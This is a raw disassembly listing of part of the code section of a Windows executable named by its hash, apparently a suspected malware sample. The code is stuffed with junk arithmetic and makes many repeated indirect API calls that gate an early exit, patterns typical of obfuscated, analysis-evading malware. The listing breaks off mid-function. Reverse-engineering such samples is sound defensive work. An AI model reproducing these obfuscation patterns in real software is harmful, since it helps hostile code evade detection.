
5c067c49ebc499498ea887c830367a0a793e541ad872e10cb805bbecdf0a0f64.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	or     DWORD PTR ds:0x42c010,0x42b004
  401013:	push   edi
  401014:	adc    DWORD PTR ds:0x42c000,0x42b014
  40101e:	push   0x42e423
  401023:	dec    DWORD PTR ds:0x42a018
  401029:	xor    edi,edi
  40102b:	not    DWORD PTR ds:0x42901c
  401031:	inc    edi
  401032:	push   edi
  401033:	push   edi
  401034:	call   DWORD PTR ds:0x42eca3
  40103a:	test   eax,eax
  40103c:	mov    DWORD PTR ds:0x42b01c,0x7587
  401046:	je     0x401075
  40104c:	lea    eax,[ebp-0x64]
  40104f:	not    DWORD PTR ds:0x42b004
  401055:	push   eax
  401056:	adc    DWORD PTR ds:0x42d00c,0x42d014
  401060:	call   DWORD PTR ds:0x42ec6b
  401066:	mov    DWORD PTR ds:0x42a00c,0x7907
  401070:	jmp    0x402bbe
  401075:	sub    DWORD PTR ds:0x42a010,0x42a01c
  40107f:	push   esi
  401080:	mov    esi,DWORD PTR ds:0x42ecaf
  401086:	push   0x8
  401088:	sub    DWORD PTR ds:0x429004,0x42c000
  401092:	push   0x42e433
  401097:	sub    DWORD PTR ds:0x429000,0x1be5
  4010a1:	call   esi
  4010a3:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010ad:	test   eax,eax
  4010af:	mov    DWORD PTR ds:0x42b000,0x51df
  4010b9:	je     0x4010de
  4010bf:	lea    eax,[ebp-0x64]
  4010c2:	and    DWORD PTR ds:0x42d014,0x42a004
  4010cc:	push   eax
  4010cd:	inc    DWORD PTR ds:0x42d008
  4010d3:	call   DWORD PTR ds:0x42ec6b
  4010d9:	jmp    0x402bbd
  4010de:	xor    DWORD PTR ds:0x42a008,0x429000
  4010e8:	push   ebx
  4010e9:	mov    ebx,DWORD PTR ds:0x42ec7b
  4010ef:	add    DWORD PTR ds:0x429004,0x5c52
  4010f9:	push   0x42e443
  4010fe:	adc    DWORD PTR ds:0x42c014,0x42b014
  401108:	push   edi
  401109:	push   edi
  40110a:	and    DWORD PTR ds:0x429020,0x61d3
  401114:	call   ebx
  401116:	test   eax,eax
  401118:	mov    DWORD PTR ds:0x42b018,0x2d2c
  401122:	je     0x40115f
  401128:	sbb    DWORD PTR ds:0x42a010,0x429004
  401132:	lea    eax,[ebp-0x64]
  401135:	xor    DWORD PTR ds:0x42c000,0x429008
  40113f:	push   eax
  401140:	or     DWORD PTR ds:0x429000,0x4b22
  40114a:	call   DWORD PTR ds:0x42ec6b
  401150:	mov    DWORD PTR ds:0x429004,0x6e7d
  40115a:	jmp    0x402bbc
  40115f:	push   0xc
  401161:	sbb    DWORD PTR ds:0x42d014,0x5298
  40116b:	push   0x42e467
  401170:	sbb    DWORD PTR ds:0x42c010,0x42c008
  40117a:	call   esi
  40117c:	dec    DWORD PTR ds:0x42d000
  401182:	test   eax,eax
  401184:	jne    0x401dcc
  40118a:	push   0x7
  40118c:	push   0x42e47b
  401191:	call   esi
  401193:	adc    DWORD PTR ds:0x429014,0x42900c
  40119d:	test   eax,eax
  40119f:	mov    DWORD PTR ds:0x42c000,0x2037
  4011a9:	jne    0x401dcc
  4011af:	push   0x8
  4011b1:	xor    DWORD PTR ds:0x42d010,0x429014
  4011bb:	push   0x42e48b
  4011c0:	and    DWORD PTR ds:0x42d010,0x7e73
  4011ca:	call   esi
  4011cc:	test   eax,eax
  4011ce:	mov    DWORD PTR ds:0x429014,0x43a5
  4011d8:	jne    0x401dcc
  4011de:	push   0x42e49b
  4011e3:	adc    DWORD PTR ds:0x429014,0x42b00c
  4011ed:	push   edi
  4011ee:	push   edi
  4011ef:	call   DWORD PTR ds:0x42eca3
  4011f5:	xor    DWORD PTR ds:0x429008,0xc25
  4011ff:	test   eax,eax
  401201:	mov    DWORD PTR ds:0x42b004,0x1e9f
  40120b:	jne    0x401dcc
  401211:	sbb    DWORD PTR ds:0x42b008,0x42a01c
  40121b:	push   0x42e4ab
  401220:	push   edi
  401221:	sbb    DWORD PTR ds:0x42b000,0x42b018
  40122b:	push   edi
  40122c:	sbb    DWORD PTR ds:0x42a008,0x42c00c
  401236:	call   ebx
  401238:	adc    DWORD PTR ds:0x42a01c,0xefe
  401242:	test   eax,eax
  401244:	mov    DWORD PTR ds:0x42d014,0x5190
  40124e:	jne    0x401dcc
  401254:	sub    DWORD PTR ds:0x42b000,0x721d
  40125e:	push   0xc
  401260:	add    DWORD PTR ds:0x42d018,0x42c000
  40126a:	push   0x42e4cf
  40126f:	call   esi
  401271:	test   eax,eax
  401273:	mov    DWORD PTR ds:0x42a014,0x465b
  40127d:	jne    0x401dcc
  401283:	or     DWORD PTR ds:0x42d014,0x42900c
  40128d:	push   0x7
  40128f:	push   0x42e4e3
  401294:	xor    DWORD PTR ds:0x42c014,0x14b0
  40129e:	call   esi
  4012a0:	test   eax,eax
  4012a2:	mov    DWORD PTR ds:0x42a01c,0x4b6
  4012ac:	jne    0x401dcc
  4012b2:	push   0x8
  4012b4:	or     DWORD PTR ds:0x429028,0x429010
  4012be:	push   0x42e4f3
  4012c3:	sbb    DWORD PTR ds:0x42a010,0x429008
  4012cd:	call   esi
  4012cf:	test   eax,eax
  4012d1:	mov    DWORD PTR ds:0x42a00c,0x7915
  4012db:	jne    0x401dcc
  4012e1:	or     DWORD PTR ds:0x42b000,0xa15
  4012eb:	push   0x42e503
  4012f0:	push   edi
  4012f1:	sub    DWORD PTR ds:0x42901c,0x42c008
  4012fb:	push   edi
  4012fc:	xor    DWORD PTR ds:0x42a01c,0x42d010
  401306:	call   DWORD PTR ds:0x42eca3
  40130c:	test   eax,eax
  40130e:	jne    0x401dcc
  401314:	sub    DWORD PTR ds:0x42d014,0x42a000
  40131e:	push   0x42e513
  401323:	adc    DWORD PTR ds:0x42b018,0x14c4
  40132d:	push   edi
  40132e:	xor    DWORD PTR ds:0x42c008,0x6706
  401338:	push   edi
  401339:	or     DWORD PTR ds:0x42a01c,0x6055
  401343:	call   ebx
  401345:	sub    DWORD PTR ds:0x429014,0x42b00c
  40134f:	test   eax,eax
  401351:	mov    DWORD PTR ds:0x42d00c,0x550a
  40135b:	jne    0x401dcc
  401361:	push   0xc
  401363:	push   0x42e537
  401368:	adc    DWORD PTR ds:0x42c00c,0x429018
  401372:	call   esi
  401374:	test   eax,eax
  401376:	mov    DWORD PTR ds:0x429024,0x758e
  401380:	jne    0x401dcc
  401386:	push   0x7
  401388:	adc    DWORD PTR ds:0x429010,0x1615
  401392:	push   0x42e54b
  401397:	sub    DWORD PTR ds:0x429008,0x42b01c
  4013a1:	call   esi
  4013a3:	adc    DWORD PTR ds:0x42c01c,0x7f54
  4013ad:	test   eax,eax
  4013af:	jne    0x401dcc
  4013b5:	or     DWORD PTR ds:0x429000,0x429008
  4013bf:	push   0x8
  4013c1:	sub    DWORD PTR ds:0x42a000,0x50c8
  4013cb:	push   0x42e55b
  4013d0:	call   esi
  4013d2:	xor    DWORD PTR ds:0x42a018,0x58f3
  4013dc:	test   eax,eax
  4013de:	mov    DWORD PTR ds:0x42a010,0x4d09
  4013e8:	jne    0x401dcc
  4013ee:	push   0x42e56b
  4013f3:	push   edi
  4013f4:	sbb    DWORD PTR ds:0x42c00c,0x429018
  4013fe:	push   edi
  4013ff:	call   DWORD PTR ds:0x42eca3
  401405:	sbb    DWORD PTR ds:0x42d008,0x42d004
  40140f:	test   eax,eax
  401411:	mov    DWORD PTR ds:0x42a010,0xbaa
  40141b:	jne    0x401dcc
  401421:	push   0x42e57b
  401426:	push   edi
  401427:	push   edi
  401428:	call   ebx
  40142a:	sbb    DWORD PTR ds:0x42b000,0x429014
  401434:	test   eax,eax
  401436:	mov    DWORD PTR ds:0x42d008,0x1c53
  401440:	jne    0x401dcc
  401446:	adc    DWORD PTR ds:0x42a00c,0x429024
  401450:	push   0xc
  401452:	push   0x42e59f
  401457:	sbb    DWORD PTR ds:0x429028,0x2f15
  401461:	call   esi
  401463:	test   eax,eax
  401465:	mov    DWORD PTR ds:0x42d004,0x2bd4
  40146f:	jne    0x401dcc
  401475:	mov    DWORD PTR ds:0x42d014,0xc7e
  40147f:	push   0x7
  401481:	or     DWORD PTR ds:0x42b01c,0x629c
  40148b:	push   0x42e5b3
  401490:	call   esi
  401492:	xor    DWORD PTR ds:0x429020,0x42c014
  40149c:	test   eax,eax
  40149e:	mov    DWORD PTR ds:0x42b008,0x386
  4014a8:	jne    0x401dcc
  4014ae:	push   0x8
  4014b0:	push   0x42e5c3
  4014b5:	sub    DWORD PTR ds:0x429024,0x42a008
  4014bf:	call   esi
  4014c1:	sub    DWORD PTR ds:0x42b004,0x42c018
  4014cb:	test   eax,eax
  4014cd:	mov    DWORD PTR ds:0x42900c,0x6fc8
  4014d7:	jne    0x401dcc
  4014dd:	xor    DWORD PTR ds:0x42d010,0x42901c
  4014e7:	push   0x42e5d3
  4014ec:	and    DWORD PTR ds:0x42d014,0x50c
  4014f6:	push   edi
  4014f7:	push   edi
  4014f8:	sbb    DWORD PTR ds:0x42b000,0x3361
  401502:	call   DWORD PTR ds:0x42eca3
  401508:	test   eax,eax
  40150a:	mov    DWORD PTR ds:0x42b008,0x5d56
  401514:	jne    0x401dcc
  40151a:	xor    DWORD PTR ds:0x42a000,0x4d69
  401524:	push   0x42e5e3
  401529:	and    DWORD PTR ds:0x429024,0x42a014
  401533:	push   edi
  401534:	or     DWORD PTR ds:0x42c004,0x3817
  40153e:	push   edi
  40153f:	add    DWORD PTR ds:0x429024,0x2571
  401549:	call   ebx
  40154b:	xor    DWORD PTR ds:0x429028,0x42b00c
  401555:	test   eax,eax
  401557:	mov    DWORD PTR ds:0x42b00c,0x17fe
  401561:	jne    0x401dcc
  401567:	mov    DWORD PTR ds:0x42c014,0x28c7
  401571:	push   0xc
  401573:	and    DWORD PTR ds:0x429024,0x5a57
  40157d:	push   0x42e607
  401582:	call   esi
  401584:	test   eax,eax
  401586:	mov    DWORD PTR ds:0x42b00c,0xc7e
  401590:	jne    0x401dcc
  401596:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015a0:	push   0x7
  4015a2:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015ac:	push   0x42e61b
  4015b1:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015bb:	call   esi
  4015bd:	xor    DWORD PTR ds:0x42c00c,0x55d5
  4015c7:	test   eax,eax
  4015c9:	jne    0x401dcc
  4015cf:	or     DWORD PTR ds:0x429008,0x62a0
  4015d9:	push   0x8
  4015db:	or     DWORD PTR ds:0x429020,0x42d018
  4015e5:	push   0x42e62b
  4015ea:	call   esi
  4015ec:	test   eax,eax
  4015ee:	mov    DWORD PTR ds:0x429010,0x43d8
  4015f8:	jne    0x401dcc
  4015fe:	push   0x42e63b
  401603:	sub    DWORD PTR ds:0x42a008,0x5452
  40160d:	push   edi
  40160e:	adc    DWORD PTR ds:0x42b004,0x3794
  401618:	push   edi
  401619:	add    DWORD PTR ds:0x42b018,0x429000
  401623:	call   DWORD PTR ds:0x42eca3
  401629:	add    DWORD PTR ds:0x42b014,0x42c014
  401633:	test   eax,eax
  401635:	mov    DWORD PTR ds:0x42c010,0x9db
  40163f:	jne    0x401dcc
  401645:	add    DWORD PTR ds:0x42b01c,0x42c010
  40164f:	push   0x42e64b
  401654:	push   edi
  401655:	push   edi
  401656:	call   ebx
  401658:	test   eax,eax
  40165a:	jne    0x401dcc
  401660:	sub    DWORD PTR ds:0x42a010,0x42b00c
  40166a:	push   0xc
  40166c:	xor    DWORD PTR ds:0x42a000,0x46f8
  401676:	push   0x42e66f
  40167b:	sub    DWORD PTR ds:0x429028,0x1e37
  401685:	call   esi
  401687:	not    DWORD PTR ds:0x42b000
  40168d:	test   eax,eax
  40168f:	mov    DWORD PTR ds:0x42a010,0x1824
  401699:	jne    0x401dcc
  40169f:	push   0x7
  4016a1:	neg    DWORD PTR ds:0x42d004
  4016a7:	push   0x42e683
  4016ac:	call   esi
  4016ae:	xor    DWORD PTR ds:0x429020,0x5303
  4016b8:	test   eax,eax
  4016ba:	jne    0x401dcc
  4016c0:	sub    DWORD PTR ds:0x429014,0x42c01c
  4016ca:	push   0x8
  4016cc:	not    DWORD PTR ds:0x429000
  4016d2:	push   0x42e693
  4016d7:	or     DWORD PTR ds:0x42c01c,0x7461
  4016e1:	call   esi
  4016e3:	test   eax,eax
  4016e5:	jne    0x401dcc
  4016eb:	or     DWORD PTR ds:0x42b010,0x6614
  4016f5:	push   0x42e6a3
  4016fa:	push   edi
  4016fb:	and    DWORD PTR ds:0x42b01c,0x42a008
  401705:	push   edi
  401706:	call   DWORD PTR ds:0x42eca3
  40170c:	sub    DWORD PTR ds:0x429010,0x42a018
  401716:	test   eax,eax
  401718:	mov    DWORD PTR ds:0x42b004,0x423f
  401722:	jne    0x401dcc
  401728:	push   0x42e6b3
  40172d:	and    DWORD PTR ds:0x42d014,0x5d3e
  401737:	push   edi
  401738:	push   edi
  401739:	call   ebx
  40173b:	sub    DWORD PTR ds:0x42a004,0x8003
  401745:	test   eax,eax
  401747:	jne    0x401dcc
  40174d:	push   0xc
  40174f:	push   0x42e6d7
  401754:	call   esi
  401756:	or     DWORD PTR ds:0x42a014,0x792e
  401760:	test   eax,eax
  401762:	jne    0x401dcc
  401768:	add    DWORD PTR ds:0x42d004,0x429000
  401772:	push   0x7
  401774:	sub    DWORD PTR ds:0x42c010,0x560a
  40177e:	push   0x42e6eb
  401783:	call   esi
  401785:	test   eax,eax
  401787:	mov    DWORD PTR ds:0x42b008,0x3099
  401791:	jne    0x401dcc
  401797:	xor    DWORD PTR ds:0x42a01c,0x42c010
  4017a1:	push   0x8
  4017a3:	push   0x42e6fb
  4017a8:	sub    DWORD PTR ds:0x42901c,0x42c000
  4017b2:	call   esi
  4017b4:	test   eax,eax
  4017b6:	mov    DWORD PTR ds:0x42c010,0x6a70
  4017c0:	jne    0x401dcc
  4017c6:	push   0x42e70b
  4017cb:	push   edi
  4017cc:	push   edi
  4017cd:	mov    DWORD PTR ds:0x42d01c,0x630d
  4017d7:	call   DWORD PTR ds:0x42eca3
  4017dd:	sbb    DWORD PTR ds:0x429024,0x42b018
  4017e7:	test   eax,eax
  4017e9:	mov    DWORD PTR ds:0x42901c,0x686
  4017f3:	jne    0x401dcc
  4017f9:	push   0x42e71b
  4017fe:	and    DWORD PTR ds:0x42c008,0x4bbd
  401808:	push   edi
  401809:	or     DWORD PTR ds:0x429024,0x42d000
  401813:	push   edi
  401814:	call   ebx
  401816:	and    DWORD PTR ds:0x42b018,0x1774
  401820:	test   eax,eax
  401822:	jne    0x401dcc
  401828:	push   0xc
  40182a:	or     DWORD PTR ds:0x42b000,0x3dd
  401834:	push   0x42e73f
  401839:	call   esi
  40183b:	test   eax,eax
  40183d:	jne    0x401dcc
  401843:	push   0x7
  401845:	sub    DWORD PTR ds:0x429010,0x42c004
  40184f:	push   0x42e753
  401854:	or     DWORD PTR ds:0x42d014,0x42c010
  40185e:	call   esi
  401860:	or     DWORD PTR ds:0x42b010,0x42b018
  40186a:	test   eax,eax
  40186c:	jne    0x401dcc
  401872:	push   0x8
  401874:	push   0x42e763
  401879:	call   esi
  40187b:	test   eax,eax
  40187d:	jne    0x401dcc
  401883:	and    DWORD PTR ds:0x42c004,0x42900c
  40188d:	push   0x42e773
  401892:	push   edi
  401893:	push   edi
  401894:	call   DWORD PTR ds:0x42eca3
  40189a:	mov    DWORD PTR ds:0x42a004,0x7c46
  4018a4:	test   eax,eax
  4018a6:	jne    0x401dcc
  4018ac:	push   0x42e783
  4018b1:	sbb    DWORD PTR ds:0x42b010,0x42a010
  4018bb:	push   edi
  4018bc:	push   edi
  4018bd:	or     DWORD PTR ds:0x42d014,0x42900c
  4018c7:	call   ebx
  4018c9:	test   eax,eax
  4018cb:	jne    0x401dcc
  4018d1:	adc    DWORD PTR ds:0x42c000,0x429028
  4018db:	push   0xc
  4018dd:	sub    DWORD PTR ds:0x42a014,0xc65
  4018e7:	push   0x42e7a7
  4018ec:	call   esi
  4018ee:	test   eax,eax
  4018f0:	mov    DWORD PTR ds:0x42c014,0x6571
  4018fa:	jne    0x401dcc
  401900:	push   0x7
  401902:	adc    DWORD PTR ds:0x42a014,0x42b00c
  40190c:	push   0x42e7bb
  401911:	mov    DWORD PTR ds:0x42d004,0x12ce
  40191b:	call   esi
  40191d:	dec    DWORD PTR ds:0x42a010
  401923:	test   eax,eax
  401925:	mov    DWORD PTR ds:0x42b004,0x22d3
  40192f:	jne    0x401dcc
  401935:	xor    DWORD PTR ds:0x42d018,0x7580
  40193f:	push   0x8
  401941:	mov    DWORD PTR ds:0x42d014,0x4bef
  40194b:	push   0x42e7cb
  401950:	add    DWORD PTR ds:0x42b000,0x4980
  40195a:	call   esi
  40195c:	test   eax,eax
  40195e:	jne    0x401dcc
  401964:	and    DWORD PTR ds:0x42b000,0x472c
  40196e:	push   0x42e7db
  401973:	push   edi
  401974:	push   edi
  401975:	xor    DWORD PTR ds:0x42c014,0x42b018
  40197f:	call   DWORD PTR ds:0x42eca3
  401985:	or     DWORD PTR ds:0x42900c,0x429020
  40198f:	test   eax,eax
  401991:	mov    DWORD PTR ds:0x42c00c,0x6dbd
  40199b:	jne    0x401dcc
  4019a1:	not    DWORD PTR ds:0x42b00c
  4019a7:	push   0x42e7eb
  4019ac:	or     DWORD PTR ds:0x42d000,0x4414
  4019b6:	push   edi
  4019b7:	sub    DWORD PTR ds:0x429020,0x7e0
  4019c1:	push   edi
  4019c2:	xor    DWORD PTR ds:0x42d010,0x4db0
  4019cc:	call   ebx
  4019ce:	test   eax,eax
  4019d0:	jne    0x401dcc
  4019d6:	sub    DWORD PTR ds:0x42a014,0x10f4
  4019e0:	push   0xc
  4019e2:	sub    DWORD PTR ds:0x42b004,0x42d014
  4019ec:	push   0x42e80f
  4019f1:	call   esi
  4019f3:	test   eax,eax
  4019f5:	jne    0x401dcc
  4019fb:	push   0x7
  4019fd:	xor    DWORD PTR ds:0x42b000,0x360b
  401a07:	push   0x42e823
  401a0c:	call   esi
  401a0e:	test   eax,eax
  401a10:	jne    0x401dcc
  401a16:	push   0x8
  401a18:	or     DWORD PTR ds:0x42c01c,0x6aa9
  401a22:	push   0x42e833
  401a27:	add    DWORD PTR ds:0x42d014,0x21f
  401a31:	call   esi
  401a33:	or     DWORD PTR ds:0x42d004,0x505e
  401a3d:	test   eax,eax
  401a3f:	mov    DWORD PTR ds:0x42c00c,0x1afa
  401a49:	jne    0x401dcc
  401a4f:	push   0x42e843
  401a54:	or     DWORD PTR ds:0x42b01c,0x4806
  401a5e:	push   edi
  401a5f:	push   edi
  401a60:	call   DWORD PTR ds:0x42eca3
  401a66:	or     DWORD PTR ds:0x42c018,0x6442
  401a70:	test   eax,eax
  401a72:	jne    0x401dcc
  401a78:	push   0x42e853
  401a7d:	push   edi
  401a7e:	not    DWORD PTR ds:0x42d018
  401a84:	push   edi
  401a85:	adc    DWORD PTR ds:0x429028,0x26c2
  401a8f:	call   ebx
  401a91:	sbb    DWORD PTR ds:0x42a000,0x42d010
  401a9b:	test   eax,eax
  401a9d:	mov    DWORD PTR ds:0x42b000,0x1a50
  401aa7:	jne    0x401dcc
  401aad:	adc    DWORD PTR ds:0x42c00c,0x5a53
  401ab7:	push   0xc
  401ab9:	push   0x42e877
  401abe:	or     DWORD PTR ds:0x42900c,0x964
  401ac8:	call   esi
  401aca:	sbb    DWORD PTR ds:0x429014,0x5b18
  401ad4:	test   eax,eax
  401ad6:	jne    0x401dcc
  401adc:	push   0x7
  401ade:	add    DWORD PTR ds:0x42d01c,0x42d000
  401ae8:	push   0x42e88b
  401aed:	and    DWORD PTR ds:0x42900c,0x4f3f
  401af7:	call   esi
  401af9:	xor    DWORD PTR ds:0x42a018,0x42a01c
  401b03:	test   eax,eax
  401b05:	jne    0x401dcc
  401b0b:	sbb    DWORD PTR ds:0x429018,0xc00
  401b15:	push   0x8
  401b17:	add    DWORD PTR ds:0x42c004,0x3ea1
  401b21:	push   0x42e89b
  401b26:	call   esi
  401b28:	sub    DWORD PTR ds:0x42c000,0x352b
  401b32:	test   eax,eax
  401b34:	mov    DWORD PTR ds:0x42901c,0x47d2
  401b3e:	jne    0x401dcc
  401b44:	push   0x42e8ab
  401b49:	or     DWORD PTR ds:0x42a004,0x22e5
  401b53:	push   edi
  401b54:	push   edi
  401b55:	add    DWORD PTR ds:0x42c008,0x2ef5
  401b5f:	call   DWORD PTR ds:0x42eca3
  401b65:	test   eax,eax
  401b67:	mov    DWORD PTR ds:0x429000,0xe12
  401b71:	jne    0x401dcc
  401b77:	push   0x42e8bb
  401b7c:	inc    DWORD PTR ds:0x429008
  401b82:	push   edi
  401b83:	push   edi
  401b84:	and    DWORD PTR ds:0x429020,0x42c008
  401b8e:	call   ebx
  401b90:	mov    DWORD PTR ds:0x42d01c,0x65ff
  401b9a:	test   eax,eax
  401b9c:	jne    0x401dcc
  401ba2:	add    DWORD PTR ds:0x42d00c,0x8c2
  401bac:	push   0xc
  401bae:	and    DWORD PTR ds:0x42a010,0x429020
  401bb8:	push   0x42e8df
  401bbd:	call   esi
  401bbf:	test   eax,eax
  401bc1:	jne    0x401dcc
  401bc7:	push   0x7
  401bc9:	not    DWORD PTR ds:0x42a004
  401bcf:	push   0x42e8f3
  401bd4:	call   esi
  401bd6:	test   eax,eax
  401bd8:	jne    0x401dcc
  401bde:	push   0x8
  401be0:	push   0x42e903
  401be5:	add    DWORD PTR ds:0x429028,0x63a0
  401bef:	call   esi
  401bf1:	test   eax,eax
  401bf3:	mov    DWORD PTR ds:0x42c01c,0x185a
  401bfd:	jne    0x401dcc
  401c03:	xor    DWORD PTR ds:0x42d00c,0x42c018
  401c0d:	push   0x42e913
  401c12:	push   edi
  401c13:	adc    DWORD PTR ds:0x42a008,0x42d004
  401c1d:	push   edi
  401c1e:	sbb    DWORD PTR ds:0x42d010,0x4b82
  401c28:	call   DWORD PTR ds:0x42eca3
  401c2e:	test   eax,eax
  401c30:	mov    DWORD PTR ds:0x42c00c,0x2dd4
  401c3a:	jne    0x401dcc
  401c40:	adc    DWORD PTR ds:0x42d004,0x42a004
  401c4a:	push   0x42e923
  401c4f:	push   edi
  401c50:	sbb    DWORD PTR ds:0x42c008,0x42b004
  401c5a:	push   edi
  401c5b:	sub    DWORD PTR ds:0x42a010,0x42b000
  401c65:	call   ebx
  401c67:	test   eax,eax
  401c69:	jne    0x401dcc
  401c6f:	inc    DWORD PTR ds:0x42b014
  401c75:	push   0xc
  401c77:	mov    DWORD PTR ds:0x42d01c,0xa60
  401c81:	push   0x42e947
  401c86:	sub    DWORD PTR ds:0x42c00c,0x3e85
  401c90:	call   esi
  401c92:	test   eax,eax
  401c94:	mov    DWORD PTR ds:0x42b010,0x6d5c
  401c9e:	jne    0x401dcc
  401ca4:	push   0x7
  401ca6:	and    DWORD PTR ds:0x429000,0x42b000
  401cb0:	push   0x42e95b
  401cb5:	add    DWORD PTR ds:0x42b008,0x42a018
  401cbf:	call   esi
  401cc1:	test   eax,eax
  401cc3:	mov    DWORD PTR ds:0x42c014,0x2a16
  401ccd:	jne    0x401dcc
  401cd3:	add    DWORD PTR ds:0x42d000,0x429000
  401cdd:	push   0x8
  401cdf:	push   0x42e96b
  401ce4:	call   esi
  401ce6:	test   eax,eax
  401ce8:	jne    0x401dcc
  401cee:	add    DWORD PTR ds:0x42b01c,0x42a01c
  401cf8:	push   0x42e97b
  401cfd:	sbb    DWORD PTR ds:0x429018,0x3807
  401d07:	push   edi
  401d08:	adc    DWORD PTR ds:0x42c014,0x42b01c
  401d12:	push   edi
  401d13:	call   DWORD PTR ds:0x42eca3
  401d19:	xor    DWORD PTR ds:0x42c000,0x727e
  401d23:	test   eax,eax
  401d25:	mov    DWORD PTR ds:0x42900c,0x2a1e
  401d2f:	jne    0x401dcc
  401d35:	push   0x42e98b
  401d3a:	and    DWORD PTR ds:0x42a008,0x1639
  401d44:	push   edi
  401d45:	adc    DWORD PTR ds:0x429008,0x42d000
  401d4f:	push   edi
  401d50:	sbb    DWORD PTR ds:0x42c00c,0x1404
  401d5a:	call   ebx
  401d5c:	sbb    DWORD PTR ds:0x42a000,0x162a
  401d66:	test   eax,eax
  401d68:	jne    0x401dcc
  401d6e:	add    DWORD PTR ds:0x429010,0x42ec
  401d78:	push   0xc
  401d7a:	push   0x42e9af
  401d7f:	call   esi
  401d81:	or     DWORD PTR ds:0x42a014,0x42c008
  401d8b:	test   eax,eax
  401d8d:	jne    0x401dcc
  401d93:	and    DWORD PTR ds:0x42c01c,0x53f3
  401d9d:	push   0x7
  401d9f:	sub    DWORD PTR ds:0x42c000,0x429010
  401da9:	push   0x42e9c3
  401dae:	call   esi
  401db0:	xor    DWORD PTR ds:0x42d000,0x42900c
  401dba:	test   eax,eax
  401dbc:	mov    DWORD PTR ds:0x42b010,0x732d
  401dc6:	je     0x401de7
  401dcc:	sbb    DWORD PTR ds:0x429008,0x54d2
  401dd6:	xor    eax,eax
  401dd8:	mov    DWORD PTR ds:0x429010,0xb2
  401de2:	jmp    0x402bbc
  401de7:	mov    DWORD PTR [ebp-0x10],0x0
  401dee:	dec    edi
  401def:	mov    eax,DWORD PTR [ebp-0x34]
  401df2:	mov    DWORD PTR ds:0x42b004,0x3f1
  401dfc:	mov    DWORD PTR [ebp-0x34],eax
  401dff:	mov    ecx,0xf89c85b9
  401e04:	mov    DWORD PTR ds:0x42b008,0x14
  401e0e:	cmp    DWORD PTR ds:0x42b008,0x0
  401e15:	je     0x401e57
  401e1b:	cmp    DWORD PTR ds:0x42b008,0x1c
  401e22:	jne    0x401e3d
  401e28:	push   0x42b01c
  401e2d:	push   0x429028
  401e32:	push   0x42b014
  401e37:	call   DWORD PTR ds:0x42ec73
  401e3d:	xor    edi,edi
  401e3f:	xor    edi,DWORD PTR ds:0x42b008
  401e45:	dec    edi
  401e46:	mov    DWORD PTR ds:0x42b008,edi
  401e4c:	jmp    0x401e0e
  401e51:	dec    DWORD PTR ds:0x429020
  401e57:	mov    DWORD PTR [ebp-0x8],ecx
  401e5a:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  401e61:	not    edi
  401e63:	lea    eax,[ebp-0x3c]
  401e66:	sbb    DWORD PTR ds:0x42b000,0x42b008
  401e70:	mov    DWORD PTR [ebp-0x2c],eax
  401e73:	mov    edx,DWORD PTR ds:0x42c000
  401e79:	add    edx,DWORD PTR ds:0x42c00c
  401e7f:	mov    DWORD PTR ds:0x42c000,edx
  401e85:	lea    eax,[ebp-0x38]
  401e88:	inc    edi
  401e89:	mov    DWORD PTR [ebp-0x18],eax
  401e8c:	adc    esi,esi
  401e8e:	mov    eax,ds:0x42e313
  401e93:	and    DWORD PTR ds:0x429014,ebx
  401e99:	mov    eax,DWORD PTR [eax+0x1c8]
  401e9f:	mov    eax,DWORD PTR [eax]
  401ea1:	mov    edi,DWORD PTR ds:0x42b010
  401ea7:	sub    edi,DWORD PTR ds:0x42d008
  401ead:	mov    DWORD PTR ds:0x42b010,edi
  401eb3:	mov    edx,DWORD PTR [ebp-0x18]
  401eb6:	and    DWORD PTR ds:0x42c00c,0x0
  401ec0:	jmp    0x401ed2
  401ec5:	mov    edi,DWORD PTR ds:0x42c00c
  401ecb:	inc    edi
  401ecc:	mov    DWORD PTR ds:0x42c00c,edi
  401ed2:	cmp    DWORD PTR ds:0x42c00c,0x12
  401ed9:	jae    0x401f21
  401edf:	cmp    DWORD PTR ds:0x42c00c,0xc
  401ee6:	jne    0x401efc
  401eec:	push   0x0
  401eee:	push   0x7fec
  401ef3:	push   DWORD PTR [ebp-0x28]
  401ef6:	call   DWORD PTR ds:0x42ec77
  401efc:	cmp    DWORD PTR ds:0x42c00c,0xb
  401f03:	jne    0x401f16
  401f09:	mov    edi,DWORD PTR ds:0x42c00c
  401f0f:	inc    edi
  401f10:	mov    DWORD PTR ds:0x42c00c,edi
  401f16:	jmp    0x401ec5
  401f1b:	xor    edi,DWORD PTR ds:0x42d01c
  401f21:	mov    esi,0x7510899
  401f26:	movzx  edi,WORD PTR ds:0x42b000
  401f2d:	add    DWORD PTR ds:0x42d010,edi
  401f33:	xor    eax,esi
  401f35:	movzx  edi,BYTE PTR ds:0x429008
  401f3c:	xor    DWORD PTR ds:0x429010,edi
  401f42:	mov    edi,0x3272e0
  401f47:	sub    DWORD PTR ds:0x42a004,0x2e7b
  401f51:	add    eax,edi
  401f53:	mov    DWORD PTR ds:0x429010,0xa86
  401f5d:	mov    DWORD PTR [edx],eax
  401f5f:	mov    eax,ds:0x42eaab
  401f64:	cmp    eax,0x312bc9f6
  401f69:	mov    DWORD PTR ds:0x42d014,0x7fe
  401f73:	jne    0x402159
  401f79:	mov    eax,DWORD PTR [ebp-0x8]
  401f7c:	and    DWORD PTR ds:0x42900c,0x0
  401f86:	mov    edx,DWORD PTR ds:0x42900c
  401f8c:	inc    edx
  401f8d:	mov    DWORD PTR ds:0x42900c,edx
  401f93:	cmp    DWORD PTR ds:0x42900c,0x1e
  401f9a:	jne    0x401fc5
  401fa0:	push   DWORD PTR [ebp-0x1c]
  401fa3:	push   0x1928
  401fa8:	push   0x42c014
  401fad:	push   0x166d
  401fb2:	push   0x7171
  401fb7:	push   0x2c0a
  401fbc:	push   DWORD PTR [ebp-0x1c]
  401fbf:	call   DWORD PTR ds:0x42ec7f
  401fc5:	cmp    DWORD PTR ds:0x42900c,0x1a
  401fcc:	jb     0x401f86
  401fd2:	and    DWORD PTR ds:0x42d014,0x0
  401fdc:	jmp    0x401fee
  401fe1:	mov    edx,DWORD PTR ds:0x42d014
  401fe7:	inc    edx
